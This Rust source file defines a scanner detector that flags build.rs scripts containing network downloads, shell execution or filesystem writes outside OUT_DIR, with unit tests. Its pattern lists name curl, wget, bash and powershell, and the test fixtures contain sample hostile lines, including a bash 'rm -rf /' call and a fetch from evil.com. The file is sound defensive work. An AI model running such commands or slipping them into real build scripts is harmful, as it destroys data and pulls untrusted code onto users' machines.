use crate::detectors::Detector;
use crate::scanner::context::ScanContext;
use crate::scanner::finding::*;

pub struct BuildScriptDetector;

impl Detector for BuildScriptDetector {
    fn id(&self) -> &'static str {
        "DEP-003"
    }
    fn name(&self) -> &'static str {
        "build-script-abuse"
    }
    fn description(&self) -> &'static str {
        "Detects build.rs files with network downloads or arbitrary shell execution"
    }
    fn severity(&self) -> Severity {
        Severity::Critical
    }
    fn confidence(&self) -> Confidence {
        Confidence::Medium
    }
    fn chain(&self) -> Chain {
        Chain::Solana
    } // Listed under Solana but applies cross-chain

    fn detect(&self, ctx: &ScanContext) -> Vec<Finding> {
        let file_str = ctx.file_path.to_string_lossy();

        // Only trigger for build.rs files
        if !file_str.ends_with("build.rs") && !file_str.contains("/build.rs") {
            return Vec::new();
        }

        let mut findings = Vec::new();
        let source = &ctx.source;

        // Network access patterns
        let network_patterns: &[&str] = &[
            "reqwest::",
            "curl::",
            "ureq::",
            "hyper::Client",
            "Command::new(\"curl\")",
            "Command::new(\"wget\")",
            ".download(",
            "TcpStream::connect",
        ];

        // Shell execution patterns
        let shell_patterns: &[&str] = &[
            "Command::new(\"sh\")",
            "Command::new(\"bash\")",
            "Command::new(\"cmd\")",
            "Command::new(\"powershell\")",
        ];

        for (line_num, line) in source.lines().enumerate() {
            let line_number = line_num + 1;

            if ctx.is_suppressed(line_number, "DEP-003") {
                continue;
            }

            // Check network access patterns
            for pattern in network_patterns {
                if line.contains(pattern) {
                    findings.push(Finding {
                        detector_id: "DEP-003".to_string(),
                        name: "build-script-abuse".to_string(),
                        severity: Severity::Critical,
                        confidence: Confidence::Medium,
                        message: format!(
                            "Build script contains network access pattern: '{}'",
                            pattern
                        ),
                        file: ctx.file_path.clone(),
                        line: line_number,
                        column: 1,
                        snippet: line.trim().to_string(),
                        recommendation: "Build scripts should not download files from the network or execute arbitrary shell commands. Pin build dependencies and use cargo features instead".to_string(),
                        chain: Chain::Solana,
                    });
                }
            }

            // Check shell execution patterns
            for pattern in shell_patterns {
                if line.contains(pattern) {
                    findings.push(Finding {
                        detector_id: "DEP-003".to_string(),
                        name: "build-script-abuse".to_string(),
                        severity: Severity::Critical,
                        confidence: Confidence::Medium,
                        message: format!(
                            "Build script contains shell execution: '{}'",
                            pattern
                        ),
                        file: ctx.file_path.clone(),
                        line: line_number,
                        column: 1,
                        snippet: line.trim().to_string(),
                        recommendation: "Build scripts should not download files from the network or execute arbitrary shell commands. Pin build dependencies and use cargo features instead".to_string(),
                        chain: Chain::Solana,
                    });
                }
            }

            // Check std::process::Command with .arg("-c")
            if line.contains("std::process::Command") && source.contains(".arg(\"-c\")") {
                findings.push(Finding {
                    detector_id: "DEP-003".to_string(),
                    name: "build-script-abuse".to_string(),
                    severity: Severity::Critical,
                    confidence: Confidence::Medium,
                    message: "Build script uses std::process::Command with shell execution via .arg(\"-c\")".to_string(),
                    file: ctx.file_path.clone(),
                    line: line_number,
                    column: 1,
                    snippet: line.trim().to_string(),
                    recommendation: "Build scripts should not download files from the network or execute arbitrary shell commands. Pin build dependencies and use cargo features instead".to_string(),
                    chain: Chain::Solana,
                });
            }

            // Check file system writes outside OUT_DIR
            if (line.contains("std::fs::write(") || line.contains("std::fs::create_dir("))
                && !line.contains("OUT_DIR")
            {
                findings.push(Finding {
                    detector_id: "DEP-003".to_string(),
                    name: "build-script-abuse".to_string(),
                    severity: Severity::Critical,
                    confidence: Confidence::Medium,
                    message: "Build script writes to filesystem outside OUT_DIR".to_string(),
                    file: ctx.file_path.clone(),
                    line: line_number,
                    column: 1,
                    snippet: line.trim().to_string(),
                    recommendation: "Build scripts should not download files from the network or execute arbitrary shell commands. Pin build dependencies and use cargo features instead".to_string(),
                    chain: Chain::Solana,
                });
            }
        }

        findings
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn run_detector(source: &str) -> Vec<Finding> {
        let ast = syn::parse_file(source).unwrap();
        let ctx = ScanContext::new(
            std::path::PathBuf::from("build.rs"),
            source.to_string(),
            ast,
            Chain::Solana,
            std::collections::HashMap::new(),
        );
        BuildScriptDetector.detect(&ctx)
    }

    #[test]
    fn test_detects_curl_command() {
        let source = r#"
use std::process::Command;

fn main() {
    Command::new("curl")
        .arg("https://example.com/payload")
        .arg("-o")
        .arg("output.bin")
        .status()
        .unwrap();
}
"#;
        let findings = run_detector(source);
        assert!(
            !findings.is_empty(),
            "Should detect Command::new(\"curl\") in build.rs"
        );
        assert_eq!(findings[0].detector_id, "DEP-003");
        assert!(findings[0].message.contains("network access"));
    }

    #[test]
    fn test_no_finding_for_safe_build_script() {
        let source = r#"
fn main() {
    println!("cargo:rerun-if-changed=build.rs");
}
"#;
        let findings = run_detector(source);
        assert!(findings.is_empty(), "Should not flag safe build.rs");
    }

    #[test]
    fn test_skips_non_build_rs() {
        let source = r#"
use std::process::Command;

fn main() {
    Command::new("curl").status().unwrap();
}
"#;
        let ast = syn::parse_file(source).unwrap();
        let ctx = ScanContext::new(
            std::path::PathBuf::from("src/main.rs"),
            source.to_string(),
            ast,
            Chain::Solana,
            std::collections::HashMap::new(),
        );
        let findings = BuildScriptDetector.detect(&ctx);
        assert!(findings.is_empty(), "Should not flag non-build.rs files");
    }

    #[test]
    fn test_detects_shell_execution() {
        let source = r#"
use std::process::Command;

fn main() {
    Command::new("bash")
        .arg("-c")
        .arg("rm -rf /")
        .status()
        .unwrap();
}
"#;
        let findings = run_detector(source);
        assert!(
            !findings.is_empty(),
            "Should detect shell execution in build.rs"
        );
    }

    #[test]
    fn test_detects_network_crate() {
        let source = r#"
use reqwest::blocking::get;

fn main() {
    let resp = reqwest::blocking::get("https://evil.com/payload").unwrap();
}
"#;
        let findings = run_detector(source);
        assert!(
            !findings.is_empty(),
            "Should detect reqwest usage in build.rs"
        );
    }

    #[test]
    fn test_detects_fs_write_outside_out_dir() {
        let source = r#"
fn main() {
    std::fs::write("/tmp/evil", b"payload").unwrap();
}
"#;
        let findings = run_detector(source);
        assert!(
            !findings.is_empty(),
            "Should detect fs::write outside OUT_DIR"
        );
    }

    #[test]
    fn test_allows_fs_write_to_out_dir() {
        let source = r#"
fn main() {
    let out = std::env::var("OUT_DIR").unwrap();
    std::fs::write(OUT_DIR.join("generated.rs"), contents).unwrap();
}
"#;
        let findings = run_detector(source);
        let fs_findings: Vec<_> = findings
            .iter()
            .filter(|f| f.message.contains("filesystem"))
            .collect();
        assert!(
            fs_findings.is_empty(),
            "Should not flag fs::write to OUT_DIR"
        );
    }
}
